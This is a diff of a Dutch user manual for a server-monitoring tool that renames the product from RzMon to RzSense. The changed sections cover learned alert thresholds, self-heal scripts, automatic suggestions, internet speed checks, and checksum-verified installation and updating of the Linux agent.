-- **Altijd bijgesteld**: elke nacht vanaf 4:00 rekent RzMon alles opnieuw door, en een drempel verschuift **hooguit 10% per nacht**. Een merkbare aanpassing staat in het **wijzigingslogboek** (*🧠 Slimme drempels bijgesteld*) en is daar **terug te draaien**.
+- **Altijd bijgesteld**: elke nacht vanaf 4:00 rekent RzSense alles opnieuw door, en een drempel verschuift **hooguit 10% per nacht**. Een merkbare aanpassing staat in het **wijzigingslogboek** (*🧠 Slimme drempels bijgesteld*) en is daar **terug te draaien**.
 - **Ondergrenzen**: een warning komt nooit onder een zinnige grens (CPU en RAM 50%, ping 20 ms, HTTP 300 ms…): een server die normaal op 3% CPU draait, krijgt geen warning bij 15%.
 - **Sluipende stijging**: stijgt de normaalwaarde in twee weken flink (een geheugenlek, groeiende belasting), dan krijg je een ℹ️-melding (*Systeeminfo → Normaalwaarde stijgt sluipend*) en schuiven de drempels **niet** mee omhoog zolang dat duurt.
 - **In de melding** staat wat normaal is: *"CPU 78% · 🧠 normaal op dit uur 35–60%"*.
@@ -1723,9 +1725,9 @@ Vaste drempels passen niet altijd: een CPU die elke nacht om 3:00 op 100% staat 
 
 **In de popup van een check** (klik op een check) staat de modus, wat er nu normaal is en welke drempels nu gelden, een **weekgrafiekje** (grijs = normaal per uur, lijn = warning, streep = nu), en hoeveel dagen er de afgelopen weken een warning was met de vaste en met de slimme drempels. In de grafiek (📈) zie je de normale band en de geleerde warning.
 
-**Nieuwe en bestaande checks.** Een nieuwe check krijgt bij zijn eerste run de standaard uit *Instellingen → Monitoring → Advies* (standaard *slim met vangnet*; een check die niet kan leren, wordt handmatig). **Bestaande checks blijven handmatig**: een update verandert niets. RzMon leert wel ook voor die checks, en laat op dezelfde pagina zien waar slimme drempels minder warnings hadden gegeven (*Voorstel voor bestaande checks*), met knoppen om ze om te zetten. Dat voorstel staat ook in 📊 Analyse onder *Wat nu aanpakken*. Meerdere checks tegelijk omzetten kan ook bij *Alle checks* (🧠 Slim).
+**Nieuwe en bestaande checks.** Een nieuwe check krijgt bij zijn eerste run de standaard uit *Instellingen → Monitoring → Advies* (standaard *slim met vangnet*; een check die niet kan leren, wordt handmatig). **Bestaande checks blijven handmatig**: een update verandert niets. RzSense leert wel ook voor die checks, en laat op dezelfde pagina zien waar slimme drempels minder warnings hadden gegeven (*Voorstel voor bestaande checks*), met knoppen om ze om te zetten. Dat voorstel staat ook in 📊 Analyse onder *Wat nu aanpakken*. Meerdere checks tegelijk omzetten kan ook bij *Alle checks* (🧠 Slim).
 
-**Zelf omzetten** (vanaf 1.156.0, standaard aan): na 7 dagen leren zet RzMon een **handmatige** check zelf op **slim met vangnet**, als slimme drempels in die tijd **minstens 2 dagen minder** met een warning hadden gegeven. Het vangnet blijft je eigen *Altijd critical vanaf* (of de standaard voor dat soort check). Je krijgt een ℹ️-melding (*Meldingen → Systeemmeldingen → Drempels zelf aangepast*), bijvoorbeeld *"🧠 CPU: van vaste drempels (warning 80%) naar slim met vangnet. In de laatste 28 dagen gaf de vaste drempel op 26 dagen een warning, slim op 2."* Het staat in het **wijzigingslogboek**; zet je het daar terug, dan blijft die check **voorgoed handmatig** (RzMon zet elke check maar één keer om). Uitzetten kan met de schakelaar *Zelf omzetten* bij *Instellingen → Monitoring → Advies*.
+**Zelf omzetten** (vanaf 1.156.0, standaard aan): na 7 dagen leren zet RzSense een **handmatige** check zelf op **slim met vangnet**, als slimme drempels in die tijd **minstens 2 dagen minder** met een warning hadden gegeven. Het vangnet blijft je eigen *Altijd critical vanaf* (of de standaard voor dat soort check). Je krijgt een ℹ️-melding (*Meldingen → Systeemmeldingen → Drempels zelf aangepast*), bijvoorbeeld *"🧠 CPU: van vaste drempels (warning 80%) naar slim met vangnet. In de laatste 28 dagen gaf de vaste drempel op 26 dagen een warning, slim op 2."* Het staat in het **wijzigingslogboek**; zet je het daar terug, dan blijft die check **voorgoed handmatig** (RzSense zet elke check maar één keer om). Uitzetten kan met de schakelaar *Zelf omzetten* bij *Instellingen → Monitoring → Advies*.
 
 **De tabel *Voorstel voor bestaande checks* lezen** (vanaf 1.108.1):
 
@@ -1742,7 +1744,7 @@ Een dag telt **net als een echte melding**: pas als er zoveel metingen achter el
 ### 7.14 Zelf herstellen 🩹 (vanaf 1.107.0, agent 1.62.0)
 Per check (✎ → *🩹 Zelf herstellen*), alleen op servers met de agent:
 - **herstarten** (bij een service- of containercheck): draait de service of container niet, dan herstart de agent hem zelf, vóór zijn rapport. Lukt dat, dan blijft de check OK en krijg je alleen een ℹ️-melding (*Systeeminfo → Zelf hersteld*); lukt het niet, dan de gewone melding.
-- **een eigen herstelcommando** (bij elke check op die server): een script dat je **op de server zelf** zet, in `/etc/rzmon-agent/heal.d/<naam>`: uitvoerbaar, van root en niet door anderen te wijzigen (anders negeert de agent het). Gaat de check mis, dan vraagt RzMon de agent het uit te voeren, en **meldt pas als het niet helpt** (of als er na 5 minuten nog geen uitkomst is). Exitcode 0 = gelukt; de eerste regel uitvoer komt in de melding.
+- **een eigen herstelcommando** (bij elke check op die server): een script dat je **op de server zelf** zet, in `/etc/rzmon-agent/heal.d/<naam>`: uitvoerbaar, van root en niet door anderen te wijzigen (anders negeert de agent het). Gaat de check mis, dan vraagt RzSense de agent het uit te voeren, en **meldt pas als het niet helpt** (of als er na 5 minuten nog geen uitkomst is). Exitcode 0 = gelukt; de eerste regel uitvoer komt in de melding.
 
 ```bash
 sudo mkdir -p /etc/rzmon-agent/heal.d
@@ -1751,40 +1753,40 @@ sudo chmod 755 /etc/rzmon-agent/heal.d/vpn-herstart
 ```
 Na het volgende rapport staat *herstelcommando vpn-herstart* in de keuzelijst.
 
-**Veiligheid**: RzMon kan alleen kiezen uit wat er al op de server staat, en vraagt het alleen via een **versleutelde verbinding** (koppelcode). Iemand die in RzMon binnenkomt, kan dus geen willekeurige commando's op je servers uitvoeren. Per check hooguit **één poging per 10 minuten en 3 per dag**. Staat een check in onderhoud, dan herstelt de agent niet (misschien staat hij expres uit). Met `HEAL=0` in `/etc/default/rzmon-agent` staat zelf herstellen op die server helemaal uit. Let op: de agent draait met `ProtectSystem=full`, dus een herstelcommando kan `/usr` en `/etc` niet wijzigen (een service herstarten kan wel). Op Home Assistant OS werkt zelf herstellen niet.
+**Veiligheid**: RzSense kan alleen kiezen uit wat er al op de server staat, en vraagt het alleen via een **versleutelde verbinding** (koppelcode). Iemand die in RzSense binnenkomt, kan dus geen willekeurige commando's op je servers uitvoeren. Per check hooguit **één poging per 10 minuten en 3 per dag**. Staat een check in onderhoud, dan herstelt de agent niet (misschien staat hij expres uit). Met `HEAL=0` in `/etc/default/rzmon-agent` staat zelf herstellen op die server helemaal uit. Let op: de agent draait met `ProtectSystem=full`, dus een herstelcommando kan `/usr` en `/etc` niet wijzigen (een service herstarten kan wel). Op Home Assistant OS werkt zelf herstellen niet.
 
 ### 7.15 Slim, deel 2 💡 (vanaf 1.108.0)
-Naast de slimme drempels (§ 7.13) kijkt RzMon nog op meer plekken naar wat normaal is. Alles staat bij *Instellingen → Monitoring → Advies* en is apart **aan en uit** te zetten.
+Naast de slimme drempels (§ 7.13) kijkt RzSense nog op meer plekken naar wat normaal is. Alles staat bij *Instellingen → Monitoring → Advies* en is apart **aan en uit** te zetten.
 
 #### Slimme voorstellen
-Elke nacht (vanaf 4:30) bekijkt RzMon de geschiedenis en doet **voorstellen**. Er verandert niets tot jij op **Toepassen** klikt (behalve *melden na N*, zie hieronder); **Negeren** = dat voorstel komt nooit meer terug. Met 🔄 bepaal je ze meteen opnieuw. Toegepaste voorstellen staan in het **wijzigingslogboek** (met *💡 voorstel*) en zijn daar terug te draaien. Open voorstellen staan ook in 📊 Analyse onder *Wat nu aanpakken*.
+Elke nacht (vanaf 4:30) bekijkt RzSense de geschiedenis en doet **voorstellen**. Er verandert niets tot jij op **Toepassen** klikt (behalve *melden na N*, zie hieronder); **Negeren** = dat voorstel komt nooit meer terug. Met 🔄 bepaal je ze meteen opnieuw. Toegepaste voorstellen staan in het **wijzigingslogboek** (met *💡 voorstel*) en zijn daar terug te draaien. Open voorstellen staan ook in 📊 Analyse onder *Wat nu aanpakken*.
 
 | Voorstel | Wanneer |
 |---|---|
-| 🔔 **Melden na meer mislukte checks** | Een check had de laatste 30 dagen minstens 5 storingen en 70% daarvan was binnen 5 minuten vanzelf weer goed. RzMon rekent uit na hoeveel mislukte checks (2 tot 6) die korte haperingen wegvallen. |
+| 🔔 **Melden na meer mislukte checks** | Een check had de laatste 30 dagen minstens 5 storingen en 70% daarvan was binnen 5 minuten vanzelf weer goed. RzSense rekent uit na hoeveel mislukte checks (2 tot 6) die korte haperingen wegvallen. |
 | 🔔 **Meteen melden** | Een check staat op *melden na 3 of meer*, maar de storingen duren eigenlijk altijd lang (80% langer dan 15 minuten): dan wacht je voor niets. |
 | 🗓️ **Vast onderhoudsvenster** | Iets gaat steeds op hetzelfde moment kort mis (hooguit 90 minuten) en herstelt vanzelf: minstens 3 weken op dezelfde weekdag en tijd, of minstens 5 van de laatste 14 dagen op dezelfde tijd. Bijvoorbeeld de back-up om 2:00 of de herstart op zondag. Gaan er op één server 2 of meer checks tegelijk mis, dan geldt het venster voor de hele server. |
-| 🔗 **Afhankelijkheid** | Volgens UniFi hangt een server aan een switch of access point dat zelf in RzMon staat, of een server valt (bij ping, anders TCP/HTTP) minstens 80% van de keren tegelijk uit met een andere, meestal een router, switch, access point of firewall. |
+| 🔗 **Afhankelijkheid** | Volgens UniFi hangt een server aan een switch of access point dat zelf in RzSense staat, of een server valt (bij ping, anders TCP/HTTP) minstens 80% van de keren tegelijk uit met een andere, meestal een router, switch, access point of firewall. |
 
-**Melden na N zelf instellen** (vanaf 1.156.0, standaard aan): een voorstel voor *melden na N* voert RzMon meteen zelf uit. Je krijgt een ℹ️-melding (*Meldingen → Systeemmeldingen → Melden na N zelf aangepast*) met de reden, bijvoorbeeld *"🔔 SSH: melden na 3 mislukte checks (was 1), want 6 van de 6 storingen in 30 dagen waren binnen 5 minuten weer voorbij"*, en een regel in het **wijzigingslogboek** om terug te gaan naar de vorige waarde. Een teruggezet voorstel komt niet terug. Onderhoudsvensters en afhankelijkheden blijven voorstellen. Uitzetten kan met de schakelaar boven de voorstellen.
+**Melden na N zelf instellen** (vanaf 1.156.0, standaard aan): een voorstel voor *melden na N* voert RzSense meteen zelf uit. Je krijgt een ℹ️-melding (*Meldingen → Systeemmeldingen → Melden na N zelf aangepast*) met de reden, bijvoorbeeld *"🔔 SSH: melden na 3 mislukte checks (was 1), want 6 van de 6 storingen in 30 dagen waren binnen 5 minuten weer voorbij"*, en een regel in het **wijzigingslogboek** om terug te gaan naar de vorige waarde. Een teruggezet voorstel komt niet terug. Onderhoudsvensters en afhankelijkheden blijven voorstellen. Uitzetten kan met de schakelaar boven de voorstellen.
 
 #### Vaste onderhoudsvensters
 Onder de voorstellen staat de lijst met **vaste onderhoudsvensters**: elke dag of op één weekdag, een begintijd en een duur, voor een **server** of **één check**, met een reden. Je kunt ze daar ook zelf toevoegen (*＋ Venster toevoegen*) en weghalen. Tijdens zo'n venster gaan er geen meldingen uit, net als bij gewoon onderhoud (§ 5); de checks draaien door. Een venster over middernacht (23:30, 60 min) werkt ook.
 
 #### Slim interval ⏱️ (standaard uit)
-- **Bij een probleem sneller checken**: gaat een ping-, TCP-, HTTP- of SNMP-check mis, dan checkt RzMon hem elke **20 seconden** (instelbaar), ook binnen de cronminuut. Zo weet je sneller of een storing echt is, en wanneer hij voorbij is.
+- **Bij een probleem sneller checken**: gaat een ping-, TCP-, HTTP- of SNMP-check mis, dan checkt RzSense hem elke **20 seconden** (instelbaar), ook binnen de cronminuut. Zo weet je sneller of een storing echt is, en wanneer hij voorbij is.
 - **Stabiel = trager**: is een check al een uur goed, dan mag zijn interval tot **2×** zo lang worden (instelbaar, nooit trager dan een uur).
 - Checks van de agent volgen het rapport van de agent; daar verandert dit niets aan.
-- **Melden na N blijft gelijk** (vanaf 1.108.2): met slim interval telt *melden na N* ook in tijd. Een check op *melden na 3* met een interval van 1 minuut meldt pas als het **2 minuten** mis is (3 gewone checks), niet al na 3× 20 seconden. Een korte hapering blijft dus stil; wel ziet RzMon sneller dat het weer goed is. Hetzelfde geldt voor de tabel bij *Slimme drempels*.
+- **Melden na N blijft gelijk** (vanaf 1.108.2): met slim interval telt *melden na N* ook in tijd. Een check op *melden na 3* met een interval van 1 minuut meldt pas als het **2 minuten** mis is (3 gewone checks), niet al na 3× 20 seconden. Een korte hapering blijft dus stil; wel ziet RzSense sneller dat het weer goed is. Hetzelfde geldt voor de tabel bij *Slimme drempels*.
 
 #### Afwijkingen zonder drempels 📈
-Checks met een getal maar **zonder drempels** (SNMP-verkeer en -clients, eigen OID's, het aantal processen, logregels, commando's, en ook een ping/CPU/… op handmatig zonder drempels) krijgen geen melding, want er is niets om aan te toetsen. RzMon leert daar nu wat normaal is per uur van de week (mediaan, 10e en 95e percentiel, na 7 dagen gegevens). Is de waarde **3 metingen achter elkaar** flink anders dan normaal op dat uur, dan krijg je een ℹ️ *"📈 Switch – eth0: Ongebruikelijk hoog: 812 Mbit/s · normaal op dit uur 4–60"*. Hooguit eens per 6 uur per check. Staat bij *Systeeminfo → Afwijking*, standaard **alleen op de meldingenpagina**.
+Checks met een getal maar **zonder drempels** (SNMP-verkeer en -clients, eigen OID's, het aantal processen, logregels, commando's, en ook een ping/CPU/… op handmatig zonder drempels) krijgen geen melding, want er is niets om aan te toetsen. RzSense leert daar nu wat normaal is per uur van de week (mediaan, 10e en 95e percentiel, na 7 dagen gegevens). Is de waarde **3 metingen achter elkaar** flink anders dan normaal op dat uur, dan krijg je een ℹ️ *"📈 Switch – eth0: Ongebruikelijk hoog: 812 Mbit/s · normaal op dit uur 4–60"*. Hooguit eens per 6 uur per check. Staat bij *Systeeminfo → Afwijking*, standaard **alleen op de meldingenpagina**.
 
 #### Disk groeit hard 💾
 Groeit een disk in een uur met **5 procentpunt** of meer (instelbaar), dan krijg je een ℹ️, ook al zit hij nog ver onder de drempel: *"Groeit hard: +11 procentpunt in een uur (nu 61%). Een log of download die uit de hand loopt?"*. Hooguit eens per 6 uur per disk (*Systeeminfo → Disk groeit hard*).
 
 #### Oorzaak erbij 🕵️
-Bij de **eerste** melding van een storing kijkt RzMon wat er in de 20 minuten ervoor op die server gebeurde: een agent- of RzMon-update, een herstart, bijgewerkte pakketten, zelf herstellen, of een wijziging in RzMon zelf (wijzigingslogboek). Dat komt onderaan de melding: *"🕵️ Kort ervoor: 3 min eerder: Agent bijgewerkt van 1.61.1 naar 1.62.0"*.
+Bij de **eerste** melding van een storing kijkt RzSense wat er in de 20 minuten ervoor op die server gebeurde: een agent- of RzSense-update, een herstart, bijgewerkte pakketten, zelf herstellen, of een wijziging in RzSense zelf (wijzigingslogboek). Dat komt onderaan de melding: *"🕵️ Kort ervoor: 3 min eerder: Agent bijgewerkt van 1.61.1 naar 1.62.0"*.
 
 #### Heartbeats leren hun ritme 📥
 Een heartbeat-check (§ 7.8) onthoudt wanneer hij de laatste 30 keer binnenkwam en welke waarde er meekwam:
@@ -1792,7 +1794,7 @@ Een heartbeat-check (§ 7.8) onthoudt wanneer hij de laatste 30 keer binnenkwam 
 - **Vreemde waarde**: stuur je een waarde mee (bv. de grootte van de back-up), en is die minder dan de helft of meer dan 3× zo groot als normaal, dan een warning: *"veel minder dan normaal (1,2 GB, meestal 14 GB)"*.
 
 ### 7.16 Internet 🌍 (vanaf 1.157.0)
-Bewaakt **je internetlijn**, gemeten vanaf de server van RzMon. Bij *Instellingen → Monitoring → Internet* zet je hem met **🌍 Internet-check toevoegen** in één klik aan: er komt een apparaat **Internet** bij met vier checks.
+Bewaakt **je internetlijn**, gemeten vanaf de server van RzSense. Bij *Instellingen → Monitoring → Internet* zet je hem met **🌍 Internet-check toevoegen** in één klik aan: er komt een apparaat **Internet** bij met vier checks.
 
 | Check | Wat | Hoe vaak | Status |
 |---|---|---|---|
@@ -1800,7 +1802,7 @@ Bewaakt **je internetlijn**, gemeten vanaf de server van RzMon. Bij *Instellinge
 | **Responstijd** | google.com en cloudflare.com, elke keer met een nieuwe verbinding: DNS, verbinden, TLS en het eerste antwoord | elke 5 minuten | het gemiddelde eerste antwoord; warning 500 ms, critical 2000 ms. Eén site weg = WARNING, allebei = CRITICAL |
 | **Download** / **Upload** | de **snelheid** uit de laatste snelheidstest, in Mbit/s | elke 5 minuten (de test zelf op de ingestelde tijden) | in procent van je **abonnement**: standaard warning onder 70%, critical onder 40% |
 
-Ping en responstijd **leren mee met de slimme drempels** (§ 7.13): 's avonds is je lijn drukker dan 's nachts. De snelheid vergelijkt RzMon met je abonnement.
+Ping en responstijd **leren mee met de slimme drempels** (§ 7.13): 's avonds is je lijn drukker dan 's nachts. De snelheid vergelijkt RzSense met je abonnement.
 
 **De snelheidstest** gebruikt **speed.cloudflare.com** (dezelfde methode als hun website, geen extra programma nodig): eerst de pingtijd naar de testserver, dan download en upload, elk met 4 verbindingen tegelijk. Een richting stopt na 10 seconden, of eerder na het ingestelde aantal MB (standaard 250 MB; bij 1 Gbit/s duurt dat ongeveer 2 seconden). Een test kost dus hooguit ongeveer **500 MB**, bij 4 tests per dag zo'n **2 GB per dag**. De eerste halve seconde telt niet mee (dan komt TCP op gang). De uitslag zegt ook via welke locatie het ging, bijvoorbeeld *via AMS*.
 
@@ -1815,33 +1817,33 @@ Op die pagina zie je de laatste test (download, upload, ping, wanneer, hoeveel M
 Voor diskruimte, CPU, RAM, services en luisterende poorten van **andere** Linux-servers: Rocky, RHEL, AlmaLinux, Fedora, Debian, Ubuntu, Raspberry Pi OS en Proxmox VE.
 
 ### 8.1 Installeren met één commando
-1. Voeg in RzMon een server toe met type **Remote met agent**.
-2. Klap de server open en klik op **Agent Manager** → tabblad **🐧 Linux-server** → **🔗 Koppelcode maken**. Klik op **Kopieer** bij het commando (vanaf 1.64.0); daarin staan het adres van RzMon, een **koppelcode** (eenmalig, 15 minuten geldig) en de controlegetallen al ingevuld:
+1. Voeg in RzSense een server toe met type **Remote met agent**.
+2. Klap de server open en klik op **Agent Manager** → tabblad **🐧 Linux-server** → **🔗 Koppelcode maken**. Klik op **Kopieer** bij het commando (vanaf 1.64.0); daarin staan het adres van RzSense, een **koppelcode** (eenmalig, 15 minuten geldig) en de controlegetallen al ingevuld:
    ```bash
    curl -fsSL 'http://192.168.1.10/api.php?action=agent_install' -o rzmon-install.sh \
      && echo '<sha256>  rzmon-install.sh' | sha256sum -c - \
      && sudo bash rzmon-install.sh --url 'http://192.168.1.10' --pair 'K7QF-M2XA-9RTD-HC4P-WE8N' --agent-sha '<sha256>'
    ```
-   Het commando controleert eerst het installatiescript, en het script daarna de agent (SHA-256): onderweg gewijzigd = stoppen. Met de koppelcode haalt de agent zijn **eigen sleutel** op; er gaat geen token of sleutel leesbaar over de lijn (zie [10.1](#101-versleutelde-agents-blokkades-en-beveiligingsmeldingen-vanaf-1570)). Onder het venster wacht RzMon op de agent en meldt **✔ Gekoppeld**. De oude manier met het token staat onder *Oude manier* (voor agents ouder dan 1.50.0).
+   Het commando controleert eerst het installatiescript, en het script daarna de agent (SHA-256): onderweg gewijzigd = stoppen. Met de koppelcode haalt de agent zijn **eigen sleutel** op; er gaat geen token of sleutel leesbaar over de lijn (zie [10.1](#101-versleutelde-agents-blokkades-en-beveiligingsmeldingen-vanaf-1570)). Onder het venster wacht RzSense op de agent en meldt **✔ Gekoppeld**. De oude manier met het token staat onder *Oude manier* (voor agents ouder dan 1.50.0).
 3. Plak het op de server die je wilt bewaken. Het script:
    - installeert wat ontbreekt (`curl`, `ss`);
-   - haalt de agent op **van je eigen RzMon**, dus het werkt ook als de GitHub-repository privé is;
+   - haalt de agent op **van je eigen RzSense**, dus het werkt ook als de GitHub-repository privé is;
    - zet de instellingen in `/etc/default/rzmon-agent` (alleen leesbaar voor root);
    - laat de agent elke minuut rapporteren via een **systemd-timer**, of via cron als er geen systemd is;
-   - stuurt een **testrapport** en controleert of RzMon het accepteert;
+   - stuurt een **testrapport** en controleert of RzSense het accepteert;
    - zet het commando **`rzmon-hb`** klaar voor heartbeat-checks (agent 1.52.0, zie §7.8).
-4. Klap de server in RzMon open en voeg checks toe met **＋ Check**. Mounts en services kies je uit de lijst met wat de agent gemeld heeft (zie 8.2.2).
+4. Klap de server in RzSense open en voeg checks toe met **＋ Check**. Mounts en services kies je uit de lijst met wat de agent gemeld heeft (zie 8.2.2).
 
 | Optie | Uitleg |
 |---|---|
-| `--services "sshd nginx"` | *Verouderd.* Services kies je in RzMon (8.2.2); wat je hier opgeeft wordt ook gemeld |
-| `--interval 120` | Tik als RzMon er geen doorgeeft (30-3600, standaard 60); normaal stel je dit in RzMon in |
+| `--services "sshd nginx"` | *Verouderd.* Services kies je in RzSense (8.2.2); wat je hier opgeeft wordt ook gemeld |
+| `--interval 120` | Tik als RzSense er geen doorgeeft (30-3600, standaard 60); normaal stel je dit in RzSense in |
 | `--pair CODE` | Koppelcode uit de Agent Manager (eenmalig, 15 minuten geldig) |
 | `--fallback URL` | Reserve-adres als `--url` niet bereikbaar is (agent 1.51.0), bv. `--url https://rzmon.example.nl --fallback http://192.168.1.10`; zie § 10.1 *Agents via https* |
-| `--pin VINGERAFDRUK` | Alleen het certificaat van RzMon met deze vingerafdruk accepteren (eigen, self-signed certificaat); staat vanzelf in het commando |
+| `--pin VINGERAFDRUK` | Alleen het certificaat van RzSense met deze vingerafdruk accepteren (eigen, self-signed certificaat); staat vanzelf in het commando |
 | `--agent-sha SHA256` | De gedownloade agent hiermee controleren; staat vanzelf in het commando |
 | `--token TOKEN` | Oude manier, in plaats van een koppelcode |
-| `--insecure` | Self-signed HTTPS-certificaat van RzMon accepteren (gebruik dan ook `curl -k`); met `--pin` niet nodig |
+| `--insecure` | Self-signed HTTPS-certificaat van RzSense accepteren (gebruik dan ook `curl -k`); met `--pin` niet nodig |
 | `--cron` | Cron gebruiken in plaats van een systemd-timer |
 | `--no-epel` | Rocky/Alma/RHEL/Oracle: EPEL niet installeren (wordt bewaard als `EPEL=0`); dan geen bestanden in realtime |
 | `-y` | Niets vragen (handig voor Ansible e.d.) |
@@ -1856,10 +1858,10 @@ Het installatiescript blijft op de server staan als `rzmon-agent-setup`:
 | Logboek | `systemctl status rzmon-agent.timer` en `journalctl -u rzmon-agent -n 20` |
 | Nieuwe koppelcode invullen | `sudo rzmon-agent-setup --pair 'ABCD-EFGH-…'` (code uit de Agent Manager → 🔗 Koppelcode) |
 | Instellingen opruimen | `sudo rzmon-agent-setup --cleanup` (met reservekopie; zie 8.2.3) |
-| Services kiezen | In RzMon: **＋ Check → Service** (zie 8.2.2) |
+| Services kiezen | In RzSense: **＋ Check → Service** (zie 8.2.2) |
 | Certificaten wijzigen | `sudo rzmon-agent-setup --certs "/etc/letsencrypt/live/*/cert.pem localhost:8443"` (zie 8.5) |
 | Podman uitzetten | Zet `PODMAN=0` in `/etc/default/rzmon-agent` (zie 8.6) |
-| Agent bijwerken | Knop **⬆ Bijwerken** in RzMon (zie 8.2.1), of `sudo rzmon-agent-setup --update` (haalt de nieuwste versie van RzMon) |
+| Agent bijwerken | Knop **⬆ Bijwerken** in RzSense (zie 8.2.1), of `sudo rzmon-agent-setup --update` (haalt de nieuwste versie van RzSense) |
 | Verwijderen | `sudo rzmon-agent-setup --uninstall` |
 
 Opnieuw uitvoeren is altijd veilig. Geef je zelf iets mee, bijvoorbeeld `--pair` of `--certs`, dan wordt alleen die regel aangepast.
@@ -1867,15 +1869,15 @@ Opnieuw uitvoeren is altijd veilig. Geef je zelf iets mee, bijvoorbeeld `--pair`
 **Bijwerken = schoon installeren (vanaf agent 1.60.0).** `--update` en de knop ⬆ maken eerst een **reservekopie** van de huidige agent en `/etc/default/rzmon-agent` in `/var/lib/rzmon-agent/backup`. Daar blijven de laatste 5 bewaard; op TrueNAS staan ze in de map `backup` van de agent. Daarna komt de nieuwe agent erop, met **opgeruimde instellingen**:
 - **Wat weggaat:**
   - `TOKEN`, `ENC_KEY` en `PAIR_CODE` (met een eigen sleutel niet meer nodig);
-  - `INTERVAL` (de tik komt uit RzMon);
+  - `INTERVAL` (de tik komt uit RzSense);
   - `PIN` (staat naast de sleutel);
   - `INSECURE` (als het certificaat vastgezet is of je http gebruikt);
   - lege regels;
-  - `SERVICES`, zodra RzMon voor elke service een check heeft. RzMon maakt die checks zelf aan.
-- **Wat blijft:** alles wat je zelf instelde, zoals het adres, het reserve-adres, `CERTS`, `CERT_DIRS`, `COMMANDS` en `REMOTE_UPDATE`. Regels die RzMon niet kent, blijven ook staan.
+  - `SERVICES`, zodra RzSense voor elke service een check heeft. RzSense maakt die checks zelf aan.
+- **Wat blijft:** alles wat je zelf instelde, zoals het adres, het reserve-adres, `CERTS`, `CERT_DIRS`, `COMMANDS` en `REMOTE_UPDATE`. Regels die RzSense niet kent, blijven ook staan.
 - **Terugzetten:** `sudo cp /var/lib/rzmon-agent/backup/conf-<datum> /etc/default/rzmon-agent`. De oude agent staat ernaast als `agent-<versie>-<datum>.sh`.
 
-#### 8.2.1 Bijwerken vanuit RzMon ⬆
+#### 8.2.1 Bijwerken vanuit RzSense ⬆
 Na de eerste installatie (met het commando) werk je de agent bij met een knop:
 
 - **Per server:** klap de server open → **Agent Manager** → **⬆ Bijwerken naar …**. Daar staat ook hoe het afliep.
@@ -1883,20 +1885,20 @@ Na de eerste installatie (met het commando) werk je de agent bij met een knop:
 - **Automatisch:** zet op dezelfde kaart **Agents automatisch bijwerken** aan. Een verouderde agent werkt zichzelf dan bij zonder knop, met hooguit één poging per 6 uur.
 
 Zo gaat het:
-1. RzMon geeft de opdracht mee in het antwoord op het volgende rapport van de agent (binnen een minuut). RzMon hoeft de server dus niet zelf te kunnen bereiken.
-2. De agent haalt de nieuwe agent en `rzmon-agent-setup` op **bij je eigen RzMon** en controleert ze:
-   - het **SHA-256-controlegetal** dat RzMon meestuurt;
+1. RzSense geeft de opdracht mee in het antwoord op het volgende rapport van de agent (binnen een minuut). RzSense hoeft de server dus niet zelf te kunnen bereiken.
+2. De agent haalt de nieuwe agent en `rzmon-agent-setup` op **bij je eigen RzSense** en controleert ze:
+   - het **SHA-256-controlegetal** dat RzSense meestuurt;
    - of het geldige scripts zijn (`bash -n`);
    - of het echt de gevraagde versie is.
    Klopt er iets niet, dan installeert hij niets en meldt hij de reden.
 3. Daarna doet `rzmon-agent-setup --update` de rest, net als met de hand. De instellingen in `/etc/default/rzmon-agent` blijven staan. De systemd-service is afgeschermd (`/usr` alleen-lezen), daarom loopt de update als aparte taak via `systemd-run`. Met cron gebeurt het direct.
-4. Bij het volgende rapport zie je in RzMon **✔ bijgewerkt van 1.18.0 naar 1.19.0**, of **✘** met de reden.
+4. Bij het volgende rapport zie je in RzSense **✔ bijgewerkt van 1.18.0 naar 1.19.0**, of **✘** met de reden.
 
 Goed om te weten:
-- **Eenmalig met de hand:** agents van vóór 1.19.0 kennen de knop nog niet. Werk ze één keer bij met `sudo rzmon-agent-setup --update`; daarna gaat het met de knop. RzMon zegt het als dat nodig is.
+- **Eenmalig met de hand:** agents van vóór 1.19.0 kennen de knop nog niet. Werk ze één keer bij met `sudo rzmon-agent-setup --update`; daarna gaat het met de knop. RzSense zegt het als dat nodig is.
 - **Uitzonderen:** wil je een server alleen met de hand bijwerken, zet dan `REMOTE_UPDATE=0` in `/etc/default/rzmon-agent`. De knop geeft dan aan dat bijwerken op afstand uit staat.
 - **Home Assistant-add-on:** bijwerken gaat via de add-on winkel.
-- **Veiligheid:** RzMon kan een agent alleen laten bijwerken met het agentscript van RzMon zelf; andere commando's zijn er niet. Wie beheerder is in RzMon, bepaalt wel welke agent er op je servers draait. Bescherm je beheerdersaccounts dus goed (sterk wachtwoord, 2FA).
+- **Veiligheid:** RzSense kan een agent alleen laten bijwerken met het agentscript van RzSense zelf; andere commando's zijn er niet. Wie beheerder is in RzSense, bepaalt wel welke agent er op je servers draait. Bescherm je beheerdersaccounts dus goed (sterk wachtwoord, 2FA).
 - **Mislukt?** Kijk op de server met `journalctl -u "rzmon-agent-update-*"` (systemd) of voer `sudo rzmon-agent-setup --update` uit; dan zie je alle stappen.
 
 #### Hoe vaak rapporteert de agent? ⏱
@@ -1908,12 +1910,12 @@ De agent is **geen daemon**: hij wordt steeds opnieuw gestart, maakt een rapport
 | Linux zonder systemd, TrueNAS SCALE | cron, elke **minuut** |
 | Home Assistant-add-on | een lus in de add-on, elke **30 s** |
 
-Hoe vaak er echt een **rapport** uitgaat, de **tik**, stel je in RzMon in. Is de tik nog niet om, dan stopt de agent meteen weer (dat kost een paar milliseconden).
+Hoe vaak er echt een **rapport** uitgaat, de **tik**, stel je in RzSense in. Is de tik nog niet om, dan stopt de agent meteen weer (dat kost een paar milliseconden).
 - **Standaard voor alle agents:** *Instellingen → Agents → Agents rapporteren standaard elke …*: 30 s, 60 s (standaard), 2 min of 5 min.
 - **Per server:** *Agent Manager → ⏱ Rapporteren elke …*. *standaard* volgt de algemene instelling.
 - De agent neemt een nieuwe tik binnen een minuut over. Bij cron en op TrueNAS is één minuut het minimum.
 - **Agent offline** volgt de tik: een agent geldt pas als stil na minstens 3 gemiste tikken.
-- `INTERVAL` in `/etc/default/rzmon-agent` (of `--interval` bij de setup) geldt alleen nog als RzMon geen tik doorgeeft, bijvoorbeeld als RzMon niet bereikbaar is.
+- `INTERVAL` in `/etc/default/rzmon-agent` (of `--interval` bij de setup) geldt alleen nog als RzSense geen tik doorgeeft, bijvoorbeeld als RzSense niet bereikbaar is.
 
 **Interval per check:** zware onderdelen voert de agent alleen uit als de check aan de beurt is (het *Interval* in het checkformulier). Tussendoor stuurt hij het vorige resultaat mee:
